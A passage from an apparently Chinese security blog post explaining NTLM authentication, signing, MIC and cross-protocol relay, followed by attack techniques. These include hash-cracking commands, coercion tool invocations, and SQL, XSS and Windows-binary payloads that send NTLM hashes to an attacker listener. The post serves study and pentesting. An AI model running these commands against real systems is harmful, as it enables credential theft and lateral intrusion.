class=\"line\">zhangsan::test:bd639079c7fcae13:e9218482a856c8ea91acdb2955e3ad19:0101000000000000de63a3a05c0fdc014c7821cf994e9fcd0000000002000800540045005300540001000a004d005300530051004c000400100074006500730074002e0063006f006d0003001c004d005300530051004c002e0074006500730074002e0063006f006d000500100074006500730074002e0063006f006d0007000800de63a3a05c0fdc01060004000200000008003000300000000000000000000000002000006ca4ab8eb09638f83f178c8c95150701240ef36ed3142205bcb6443442678d480a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003100300030002e00310033003100000000000000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>通过hashcat爆破验证一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 5600 hash.txt crack.txt --force</span><br><span class=\"line\"></span><br><span class=\"line\">john hash.txt -wordlist&#x3D;crack.txt</span><br><span class=\"line\">john hash.txt --show</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250822030647548.png\" alt=\"image-20250822030647548\"></p>\n<h1 id=\"SSP-amp-SSPI\"><a href=\"#SSP-amp-SSPI\" class=\"headerlink\" title=\"SSP &amp; SSPI\"></a>SSP &amp; SSPI</h1><p>SSPI（安全支持提供程序接口，Security Support Provider Interface） ，这是 Windows 定义的一套接口，此接口定义了与安全有关的 功能函数，包括</p>\n<ul>\n<li><p>AcquireCredentialsHandle</p>\n</li>\n<li><p>InitializeSecurityContext</p>\n</li>\n<li><p>AcceptSecurityContext</p>\n</li>\n</ul>\n<p>用来获得验证、信息完整性、信息隐私等安全功能，就是定义了一套接口函数用来身份验证，会话安全等。</p>\n<p>SSP（安全支持提供者，Security Support Provider），在系统层面，SSP就是一个dll，对SSPI相关功能函数的具体实现。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。微软自己实现了如下的 SSP，用于提供安全功能：</p>\n<ol>\n<li>NTLM SSP</li>\n<li>Kerberos SSP</li>\n<li>Cred SSP</li>\n<li>Digest SSP</li>\n<li>Negotiate SSP</li>\n<li>Schannel SSP</li>\n<li>Negotiate Extensions SSP</li>\n<li>PKU2U SSP</li>\n</ol>\n<p>这里看一下 <strong>NTLM认证过程中</strong> 客户端和服务器都会用到的SSPI中的函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_ssp.png\"></p>\n<ol>\n<li>客户端通过 <strong>AcquireCredentialsHandle</strong> 函数获取用户凭据集的表示形式。</li>\n<li>客户端调用 <strong>InitializeSecurityContext</strong> 函数获取身份验证请求令牌（在本例中为Type1 NEGOTIATE），客户端将此令牌发送到服务器。</li>\n<li>服务器从客户端接收令牌，并将其作为 <strong>AcceptSecurityContext</strong>  函数的输入。这将在服务器上创建一个 <strong>本地安全上下文</strong> 来代表客户端，并生成一个身份验证响应令牌（Type2 CHALLENGE），该令牌将发送给客户端。</li>\n<li>客户端从服务器接收响应令牌，并再次调用 <strong>InitializeSecurityContext</strong> 函数，并将服务器的令牌作为输入传递。这为我们提供了另一个身份验证请求令牌（Type3 AUTHENTICATE）返回值表明安全上下文已成功初始化。</li>\n<li>服务器从客户端接收令牌，并使用令牌（Type 3）作为输入，再次调用 <strong>AcceptSecurityContext</strong>，返回值表示上下文已成功接受。不再生成令牌，身份验证完成。</li>\n</ol>\n<hr>\n<p>SSPI有什么作用？其实就是从底层SSP抽象出来了几个统一函数用来身份验证，只要几个函数能够被正确的调用，就可以不用关心下层的具体发了什么消息结构（例如NTLM中发送的消息结构为 Type 1/2/3，换成kerberos就不一样的结构了），这个抽象的、指向宽泛的消息结构被称为 <strong>Opaque Token（不透明令牌）</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823134751690.png\" alt=\"image-20250823134751690\"></p>\n<p>这一点非常重要，因为它清楚地表明了应用层（HTTP、SMB、SQL 等）与身份验证层（NTLM、Kerberos 等）完全独立，因此可以说NTLM也是个嵌入式协议，可以嵌入到上层协议中，我做了个简单的示意图</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823141317389.png\" alt=\"image-20250823141317389\"></p>\n<p>以java8 的 <code>sun.net.www.protocol.http.HttpURLConnection</code> 支持HTTP进行NTLM认证为例</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823143751980.png\" alt=\"image-20250823143751980\"></p>\n<p>最后通过JNI调用SSPI函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823144012488.png\" alt=\"image-20250823144012488\"></p>\n<h1 id=\"会话密钥\"><a href=\"#会话密钥\" class=\"headerlink\" title=\"会话密钥\"></a>会话密钥</h1><p>当认证完毕，在双方 <strong>协商启用会话签名</strong> 情况下，客户端和服务端使用一个都知道的 会话密钥（session key） 对后续所有的消息进行签名加/解密。那么双方是怎么获取到同一个会话密钥的呢？过程如下：</p>\n<ul>\n<li><p>exportedsessionkey：会话密钥（session key），<strong>客户端随机生成</strong></p>\n</li>\n<li><p>keyexchangekey：用于加密exportedsessionkey的字符串，其需要 <strong>用户密码、challenge等信息经过加密算法生成</strong></p>\n</li>\n<li><p>encryptedRandomSessionKey：通过 <strong>keyexchangekey 作为 RC4-key 加密 exportedsessionkey 得到</strong>，放在Type3消息中（Wireshark显示的 Session Key 字段，也是官方字段 EncryptedRandomSessionKeyFields）。服务端拿到这个，计算出 keyexchangekey 再运算得到exportedsessionkey，成功获得一致的会话密钥</p>\n</li>\n</ul>\n<p>所以当攻击者想要修改消息时，必须要获取会话密钥，但是没有用户密码就没有keyexchangekey，没有keyexchangekey就没法解密出会话密钥，所以就没法修改消息，保证了会话不被篡改。</p>\n<h1 id=\"会话签名\"><a href=\"#会话签名\" class=\"headerlink\" title=\"会话签名\"></a>会话签名</h1><p>会话签名是一种强大但有限的针对 NTLM 中继的缓解措施，只有 SMB 和 LDAP 可以使用。这里还要提醒，会话签名保护的是后续会话的完整性，而不是保护前期身份验证的完整性</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823191548974.png\" alt=\"image-20250823191548974\"></p>\n<p>上面说开启会话签名的情况会进行签名，那么客户端、服务端是怎么开启的？在什么时候开启的？能不能不开启？</p>\n<p>这里给出简短的结论：会话签名是否开启是在 NTLM 身份验证期间协商出来的，是根据双方 SMB/LDAP的版本/状态 来决定是否开启的</p>\n<p>针对会话签名状态基本有三种表达</p>\n<ul>\n<li>禁用（Disabled）：这意味着签名不受管理</li>\n<li>启用（Enabled）：可以在需要时处理签名，但不强制签名</li>\n<li>必填（Required）：支持并强制签名</li>\n</ul>\n<h2 id=\"SMB\"><a href=\"#SMB\" class=\"headerlink\" title=\"SMB\"></a>SMB</h2><p>首先一个SMB签名总结图：SMBv1 默认状态为 禁用（Disabled）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823194239465.png\" alt=\"image-20250823194239465\"></p>\n<p>在 SMBv1 中，Server 的默认设置为 禁用（Disabled），<strong>在SMBv2或更高弃用了Disabled，Server 的默认状态为：启用（Enabled）</strong></p>\n<p>可以通过注册表查询</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters&quot; &#x2F;v RequireSecuritySignature</span><br><span class=\"line\">    RequireSecuritySignature    REG_DWORD    0x0</span><br><span class=\"line\"></span><br><span class=\"line\">reg query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanWorkstation\\Parameters&quot; &#x2F;v EnableSecuritySignature</span><br><span class=\"line\">    EnableSecuritySignature    REG_DWORD    0x1</span><br></pre></td></tr></table></figure>\n\n<p>回到&lt;NTLM 网络认证流量分析&gt;中提到SMB其实是有三个大部分</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193006797.png\" alt=\"image-20250823193006797\"></p>\n<ul>\n<li><p>在协商阶段，双方分别表明自己的要求：是否要求其中一方签名</p>\n</li>\n<li><p>在认证阶段，双方表明各自支持的内容：是否有能力签名</p>\n</li>\n<li><p>在会话阶段，如果 <strong>要求</strong> 和 <strong>能力</strong> 兼容，则根据协商的结果进行会话</p>\n</li>\n</ul>\n<p>以域内两台普通机器为例：A -&gt; B 表明自己Enabled签名，但是不要求签名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193247243.png\" alt=\"image-20250823193247243\"></p>\n<p>B-&gt; A 也表明自己Enabled签名，但是不要求签名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193354008.png\" alt=\"image-20250823193354008\"></p>\n<p>在认证阶段 客户端和服务器 双方将 <strong>NEGOTIATE_SIGN</strong> 标志全都设置为 <strong>1</strong> ，因为它们都支持签名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823193604385.png\" alt=\"image-20250823193604385\"></p>\n<p>后续签名为空</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823194939696.png\" alt=\"image-20250823194939696\"></p>\n<p><strong>域控对SMB签名虽然默认状态为 启用（Enabled），但组策略强制对SMB进行签名</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250831223526784.png\" alt=\"image-20250831223526784\"></p>\n<h2 id=\"LDAP\"><a href=\"#LDAP\" class=\"headerlink\" title=\"LDAP\"></a>LDAP</h2><p>LDAP状态略微不同：LDAP默认状态为 协商签名（Negotiated Signing），<strong>是否签名是由客户端决定的</strong>，因此LDAP数据都默认签名</p>\n<ul>\n<li>禁用（Disabled）: 不支持数据包签名</li>\n<li>协商签名（Negotiated Signing）：可以处理签名，<strong>如果与其通信的机器也支持签名，则将被签名</strong></li>\n<li>必需（Required）: 支持并强制签名</li>\n</ul>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823195859756.png\" alt=\"image-20250823195859756\"></p>\n<h1 id=\"身份验证签名-MIC\"><a href=\"#身份验证签名-MIC\" class=\"headerlink\" title=\"身份验证签名/MIC\"></a>身份验证签名/MIC</h1><p>既然NTLM协商阶段决定了是否开启会话，是不是能通过破坏身份验证的完整性、修改认证包来禁用会话签名，比如NEGOTIATE_SIGN？实则不然。</p>\n<p>引出了一个保护身份验证阶段的签名：消息完整性代码（Message Integrity Code）—MIC，用于保护身份认证消息的完整性！</p>\n<p>MIC 是一个签名存在于Type 3 消息中，MIC的计算方式如下：计算过程使用了 <strong>会话密钥+Type 1/2/3</strong>，因此攻击者无法重新计算MIC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE)</span><br></pre></td></tr></table></figure>\n\n<p>如果直接移除 MIC是不行的因为还有另一个标志 <strong>msAvFlags</strong> 指示 MIC 存在。它也存在于 Type3中的blob，如果它是 <strong>0x00000002</strong>，则告诉服务器必须存在 MIC</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823234941709.png\" alt=\"image-20250823234941709\"></p>\n<p>如果我们将其设置 msAcFlags 为 0，并移除 MIC，这也是不行的，因为此时blob被修改，将导致NTproofstring无效从而整个NTLMv2 Response无效</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250823235126452.png\" alt=\"image-20250823235126452\"></p>\n<p>总结就是：MIC 保护 3 条消息的完整性，blob中msAvFlags标志保护 MIC 的存在性，NTLMv2 Response 保护标志的存在性。</p>\n<p>但是有一些CVE漏洞能够在目标上操作跨协议取消签名中继</p>\n<ul>\n<li>删除 MIC（CVE-2019-1040）</li>\n<li>删除 MIC 2（CVE-2019-1166）</li>\n<li>窃取会话密钥（CVE-2019-1019）</li>\n</ul>\n<h1 id=\"通道绑定-EPA\"><a href=\"#通道绑定-EPA\" class=\"headerlink\" title=\"通道绑定/EPA\"></a>通道绑定/EPA</h1><p>通道绑定（channel binding）或 EPA（身份验证的扩展保护）可以使用以下两种缓解措施中的一种或两种，为不支持会话签名的协议（如 HTTPS 和 LDAPS）提供针对 NTLM 中继的缓解：</p>\n<ul>\n<li>TLS Binding：当有 TLS 通道需要绑定（HTTPS、LDAPS）时，需要通道绑定令牌 (CBT)</li>\n<li>Service Binding：以服务主体名称 (SPN) 形式呈现的服务绑定信息，通常在没有可绑定的 TLS 通道 (HTTP) 时出现</li>\n</ul>\n<h1 id=\"跨协议Relay-签名图\"><a href=\"#跨协议Relay-签名图\" class=\"headerlink\" title=\"跨协议Relay-签名图\"></a>跨协议Relay-签名图</h1><p><strong>NTLM 身份验证消息嵌入在 SMB、HTTP、MSSQL、SMTP、IMAP 等应用协议的数据包中</strong>。LM 和 NTLM 身份验证协议独立于应用协议。这意味着可以通过某个协议（例如 HTTP）或另一个协议（例如 SMB）中继 LM 或 NTLM 身份验证消息。这称为 <strong>跨协议 LM/NTLM 中继</strong>。这也意味着可能的中继和攻击取决于身份验证消息所嵌入的应用协议。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/ntlm_relay_cross_protocol.png\"></p>\n<p>由于客户端/服务端不同的服务（SMB、LDAP、HTTP等）针对签名要求不相同，因此在跨协议组合时会产生各种 <strong>“签名兼容性”</strong></p>\n<p>小结各协议特点：</p>\n<ul>\n<li>SMB：SMB签名以 <strong>最低要求</strong> 的方式工作。如果客户端或服务器都不需要签名，则不会对会话进行签名，<strong>域控默认需要smb签名，而其他域机器默认不开启</strong></li>\n<li>LDAP：默认情况下LDAP服务器为域控，<strong>默认策略是协商签名，而不是强制签名，即 是否签名是由客户端决定的</strong>。微软于 2020 年 1 月发布安全更新，强制开启所有域控制器上 <code>LDAP channel binding</code> 与 <code>LDAP signing</code> 功能</li>\n<li>webdav、HTTP：<strong>不要求签名</strong></li>\n</ul>\n<p>下面的 <strong>跨协议中继-签名图</strong> 表示了：跨协议情况下，不同签名要求之间能否完成认证</p>\n<blockquote>\n<p>默认下，SMB无法 Relay 到 LDAP：LDAP server默认开启 协商签名（Negotiated Signing），因此如果客户端的NEGOTIATE_SIGN为1，那么LDAP server会开启会话签名，在Windows SMB client中默认NEGOTIATE_SIGN为1，所以无法从SMB relay 到 ldap</p>\n</blockquote>\n<img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/NTLM%20relay%20mitigation%20Cwqkh2tu.png\" style=\"zoom:150%;\" />\n\n<p> NTLM 跨协议中继的整体攻击路径：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/NTLM%20relay.C4GvGhyz.png\"></p>\n<h1 id=\"攻击面\"><a href=\"#攻击面\" class=\"headerlink\" title=\"攻击面\"></a>攻击面</h1><p>NTLM 的一些攻击面</p>\n<h2 id=\"Crack-破解\"><a href=\"#Crack-破解\" class=\"headerlink\" title=\"Crack-破解\"></a>Crack-破解</h2><p><strong>1. NTLM hash：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 1000 ntlm.txt</span><br><span class=\"line\">or</span><br><span class=\"line\">直接cmd5在线解密</span><br></pre></td></tr></table></figure>\n\n<p><strong>2. NTLMv2 hash/Net-NTLM v2 Hash</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashcat -m 5600 hash.txt crack.txt --force</span><br><span class=\"line\"></span><br><span class=\"line\">john hash.txt -wordlist&#x3D;crack.txt</span><br><span class=\"line\">john hash.txt --show</span><br></pre></td></tr></table></figure>\n\n<p><strong>3.Net-NTLM v1 Hash</strong></p>\n<p>针对 Net-NTLM v1 Hash 需要搭配降级攻击 破解还原出 NTLM hash</p>\n<h2 id=\"Downgrade-降级攻击\"><a href=\"#Downgrade-降级攻击\" class=\"headerlink\" title=\"Downgrade-降级攻击\"></a>Downgrade-降级攻击</h2><p>参见参考，通过降级攻击衍生出的在不触及LSASS的情况下获取NTLM hash的攻击手段 Internal-Monologue<a href=\"(https://github.com/eladshamir/Internal-Monologue)\">^3</a>，其基本原理为：<strong>通过修改注册表设置强制系统使用Net NTLMv1进行身份验证，然后本地调用NTLM认证包（MSV1_0），模拟目标用户的网络登录过程，从而获取NTLMv1 Response 并计算对应的NTLM hash</strong></p>\n<h2 id=\"PTH\"><a href=\"#PTH\" class=\"headerlink\" title=\"PTH\"></a>PTH</h2><p>针对 NTLM hash的横向利用，这篇文章不再记录</p>\n<p>后续单独写一篇文章关于PTH中一些细节： <code>UAC、LocalAccountTokenFilterPolicy、FilterAdministratorToken、KB2871997补丁、PTH的防御方法</code> </p>\n<h2 id=\"CVE漏洞\"><a href=\"#CVE漏洞\" class=\"headerlink\" title=\"CVE漏洞\"></a>CVE漏洞</h2><p>关于NTLM的CVE，个人感觉分为三大类：发起NTLM请求、绕过签名完整性检查、Reflect</p>\n<p><strong>发起NTLM请求：</strong></p>\n<ul>\n<li>PetitPotam 等基于协议强制请求</li>\n<li>CVE-2018-8581、CVE-2025-24071、CVE-2025-24054 等基于各种应用诱导性请求</li>\n</ul>\n<p><strong>绕过签名完整性检查：</strong></p>\n<ul>\n<li><p>CVE-2015-0005</p>\n</li>\n<li><p>删除 MIC（CVE-2019-1040）</p>\n</li>\n<li><p>删除 MIC 2（CVE-2019-1166）</p>\n</li>\n<li><p>窃取会话密钥（CVE-2019-1019）</p>\n</li>\n</ul>\n<p><strong>Reflect：</strong></p>\n<ul>\n<li>MS08-068</li>\n<li>MS16-075、CVE-2019-1384（Ghost potato）等各种土豆系列</li>\n<li>CVE-2025-33073</li>\n</ul>\n<h2 id=\"NTLM-Relay\"><a href=\"#NTLM-Relay\" class=\"headerlink\" title=\"NTLM Relay\"></a>NTLM Relay</h2><p>Net-NTLM Hash v2 无法破解时可以尝试针对 Net-NTLM hash 的中继攻击：NTLM Relay（以下所称的 NTLM hash 实际均为 Net-NTLM hash），<strong>能否进行Relay攻击取决后续会话签名条件</strong>，如果都开启了签名是无法同服务端进行会话的，也就无法实现攻击操作（在不使用CVE情况下）</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250824180908581.png\" alt=\"image-20250824180908581\"></p>\n<p>攻击主要分为两部分：</p>\n<ul>\n<li>获取Net-NTLM hash的方式</li>\n<li>获取Net-NTLM hash的后续 Relay 利用</li>\n</ul>\n<h1 id=\"Net-NTLM-hash获取\"><a href=\"#Net-NTLM-hash获取\" class=\"headerlink\" title=\"Net-NTLM hash获取\"></a>Net-NTLM hash获取</h1><p>有以下几种主要方式让目标机器主动或被动发起NTLM请求，然后我们捕获NTLM hash后进行后续中继攻击</p>\n<p>可以使用 responder 来捕获hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">responder -I eth1 -v</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"强制认证\"><a href=\"#强制认证\" class=\"headerlink\" title=\"强制认证\"></a>强制认证</h2><p>通过以下几种 漏洞/特性/bug 强制目标主机发起身份认证</p>\n<h3 id=\"PrinterBug\"><a href=\"#PrinterBug\" class=\"headerlink\" title=\"PrinterBug\"></a>PrinterBug</h3><p>原理：MS-RPRN协议，通过触发 SpoolService 错误，强制目标通过 RPC 接口向攻击者进行身份验证</p>\n<p>条件：打印服务开启 - spoolsv.exe</p>\n<p>poc：<a href=\"https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py\">https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 printerbug.py hack.lab&#x2F;admin:password@&lt;target&gt; &lt;listener&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PetitPotam\"><a href=\"#PetitPotam\" class=\"headerlink\" title=\"PetitPotam\"></a>PetitPotam</h3><p>原理：MS-EFSRPC 协议，通过修改EfsRpcOpenFileRaw() 中的 FileName 参数劫持认证会话，强制服务器进行验证</p>\n<p>条件：目标支持 MS-EFSR 协议  PetitPotam</p>\n<p>poc：<a href=\"https://github.com/topotam/PetitPotam\">https://github.com/topotam/PetitPotam</a></p>\n<blockquote>\n<p>PetitPotam 在2008、2012低版本环境下可无需用户匿名触发</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 PetitPotam.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br><span class=\"line\">python3 PetitPotam.py -u &#39;WIN19$&#39; -hashes :c38ca.. -d test.com -dc-ip 172.22.4.7 WIN19.test.com 172.22.4.7</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"DFSCoerce\"><a href=\"#DFSCoerce\" class=\"headerlink\" title=\"DFSCoerce\"></a>DFSCoerce</h3><p>原理：MS-EFSRPC 协议中的RPC接口来触发强制认证</p>\n<p>条件：域内启用 MS-DFSNM 协议、只对域控有效</p>\n<p>poc：<a href=\"https://github.com/Wh04m1001/DFSCoerce\">https://github.com/Wh04m1001/DFSCoerce</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 dfscoerce.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br><span class=\"line\">python3 dfscoerce.py -u &#39;WIN19$&#39; -hashes :c38ca39.. -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"ShadowCoerce\"><a href=\"#ShadowCoerce\" class=\"headerlink\" title=\"ShadowCoerce\"></a>ShadowCoerce</h3><p>原理：MS-FSRVP协议中一种依赖于远程UNC路径的特定方法来实现强制验证 IsPathSupported() 和 IsPathShadowCopied()</p>\n<p>条件：开启MS-FSRVP协议、安装了文件服务器VSS代理服务</p>\n<p>poc：<a href=\"https://github.com/ShutdownRepo/ShadowCoerce\">https://github.com/ShutdownRepo/ShadowCoerce</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 shadowcoerce.py -u admin -p password -d hack.lab &lt;listener&gt; &lt;target&gt;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PrivExchange\"><a href=\"#PrivExchange\" class=\"headerlink\" title=\"PrivExchange\"></a>PrivExchange</h3><p>原理：Exchange中提供了网络服务API - PushSubscription，允许订阅推送通知，利用该API使Exchange服务器对指定目标进行强制认证</p>\n<p>条件：目标为Exchange，且未打补丁、拥有一个带有邮箱的域用户凭据信息</p>\n<p>poc：<a href=\"https://github.com/dirkjanm/privexchange/\">https://github.com/dirkjanm/privexchange/</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 privexchange.py -u admin -p password -d hack.lab -ah &lt;listener&gt; &lt;exchange server&gt;</span><br></pre></td></tr></table></figure>\n\n<hr>\n<h3 id=\"综合利用\"><a href=\"#综合利用\" class=\"headerlink\" title=\"综合利用\"></a>综合利用</h3><p><a href=\"https://github.com/p0dalirius/Coercer\">https://github.com/p0dalirius/Coercer</a> ，通过多种方法自动强制 Windows 服务器在任意机器上进行身份验证</p>\n<p>分析目标服务器可利用的接口，使用 –analyze 参数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 Coercer.py -u admin -p password -d hack.lab -l &lt;listener&gt; -t &lt;target&gt; --analyze</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"常规\"><a href=\"#常规\" class=\"headerlink\" title=\"常规\"></a>常规</h2><p><strong>Mysql</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">select load_file(&#39;\\\\\\\\&lt;Kali address&gt;\\\\mysql&#39;);</span><br></pre></td></tr></table></figure>\n\n<p><strong>Mssql</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xp_dirtree &quot;\\\\&lt;Kali address&gt;\\aaa.com&quot;</span><br></pre></td></tr></table></figure>\n\n<p><strong>XSS</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script src&#x3D;&quot;\\\\&lt;Kali address&gt;\\xss&quot;&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>xxe/ssrf 等能发起请求的web漏洞</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">例如: WEBDAV</span><br></pre></td></tr></table></figure>\n\n<p><strong>系统命令</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 未验证</span><br><span class=\"line\">net.exe use \\\\host\\shareFload </span><br><span class=\"line\">attrib.exe \\\\host\\shareFload  </span><br><span class=\"line\">bcdboot.exe \\\\host\\shareFload  </span><br><span class=\"line\">bdeunlock.exe \\\\host\\shareFload  </span><br><span class=\"line\">cacls.exe \\\\host\\shareFload  </span><br><span class=\"line\">certreq.exe \\\\host\\shareFload #(noisy, pops an error dialog) </span><br><span class=\"line\">certutil.exe \\\\host\\shareFload  </span><br><span class=\"line\">cipher.exe \\\\host\\shareFload  </span><br><span class=\"line\">ClipUp.exe -l \\\\host\\shareFload  </span><br><span class=\"line\">cmdl32.exe \\\\host\\shareFload  </span><br><span class=\"line\">cmstp.exe &#x2F;s \\\\host\\shareFload  </span><br><span class=\"line\">colorcpl.exe \\\\host\\shareFload #(noisy, pops an error dialog)  </span><br><span class=\"line\">comp.exe &#x2F;N&#x3D;0 \\\\host\\shareFload \\\\host\\shareFload  </span><br><span class=\"line\">compact.exe \\\\host\\shareFload  </span><br><span class=\"line\">control.exe \\\\host\\shareFload  </span><br><span class=\"line\">convertvhd.exe -source \\\\host\\shareFload -destination \\\\host\\shareFload  </span><br><span class=\"line\">Defrag.exe \\\\host\\shareFload  </span><br><span class=\"line\">diskperf.exe \\\\host\\shareFload  </span><br><span class=\"line\">dispdiag.exe -out \\\\host\\shareFload  </span><br><span class=\"line\">doskey.exe &#x2F;MACROFILE&#x3D;\\\\host\\shareFload  </span><br><span class=\"line\">esentutl.exe &#x2F;k \\\\host\\shareFload  </span><br><span class=\"line\">expand.exe \\\\host\\shareFload  </span><br><span class=\"line\">extrac32.exe \\\\host\\shareFload  </span><br><span class=\"line\">FileHistory.exe \\\\host\\shareFload #(noisy, pops a gui)  </span><br><span class=\"line\">findstr.exe * \\\\host\\shareFload  </span><br><span class=\"line\">fontview.exe \\\\host\\shareFload #(noisy, pops an error dialog)  </span><br><span class=\"line\">fvenotify.exe \\\\host\\shareFload #(noisy, pops an access denied error)  </span><br><span class=\"line\">FXSCOVER.exe \\\\host\\shareFload #(noisy, pops GUI)  </span><br><span class=\"line\">hwrcomp.exe -check \\\\host\\shareFload  </span><br><span class=\"line\">hwrreg.exe \\\\host\\shareFload  </span><br><span class=\"line\">icacls.exe \\\\host\\shareFload   </span><br><span class=\"line\">licensingdiag.exe -cab \\\\host\\shareFload  </span><br><span class=\"line\">lodctr.exe \\\\host\\shareFload  </span><br><span class=\"line\">lpksetup.exe &#x2F;p \\\\host\\shareFload &#x2F;s  </span><br><span class=\"line\">makecab.exe \\\\host\\shareFload  </span><br><span class=\"line\">msiexec.exe &#x2F;update \\\\host\\shareFload &#x2F;quiet  </span><br><span class=\"line\">msinfo32.exe \\\\host\\shareFload #(noisy, pops a &quot;cannot open&quot; dialog)  </span><br><span class=\"line\">mspaint.exe \\\\host\\shareFload #(noisy, invalid path to png error)  </span><br><span class=\"line\">msra.exe &#x2F;openfile \\\\host\\shareFload #(noisy, error)  </span><br><span class=\"line\">mstsc.exe \\\\host\\shareFload #(noisy, error)  </span><br><span class=\"line\">netcfg.exe -l \\\\host\\shareFload -c p -i foo</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CVE漏洞-1\"><a href=\"#CVE漏洞-1\" class=\"headerlink\" title=\"CVE漏洞\"></a>CVE漏洞</h2><p>最近时间的 Windows 文件资源管理器欺骗漏洞（CVE-2025-24071、CVE-2025-24054）解压文件时导致泄露NTLM hash</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511230801195.png\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/image-20250511230839855.png\" alt=\"image-20250511230839855\"></p>\n<h2 id=\"诱导\"><a href=\"#诱导\" class=\"headerlink\" title=\"诱导\"></a>诱导</h2><p><strong>PDF文件</strong></p>\n<p>PDF规范允许为GoTobe和GoToR条目加载远程内容。PDF文件可以添加一项功能，请求远程SMB服务器的文件，<a href=\"https://github.com/3gstudent/Worse-PDF\">https://github.com/3gstudent/Worse-PDF</a></p>\n<p><strong>Office文件</strong></p>\n<p>修改document.xml.rels，和 word/excel2XXE类似</p>\n<p>将Target参数修改为UNC路径，然后加上 <code>TargetMode=&quot;External&quot;</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/windows-protocol/1634975532_6173bf2c4178a061cdf5a.png\"></p>\n<p><strong>Outlook邮件</strong></p>\n<p>发送邮件是支持html的，而且outlook里面的图片加载路径又可以是UNC</p>\n<figure class=\"highlight plain\"><table><tr><td 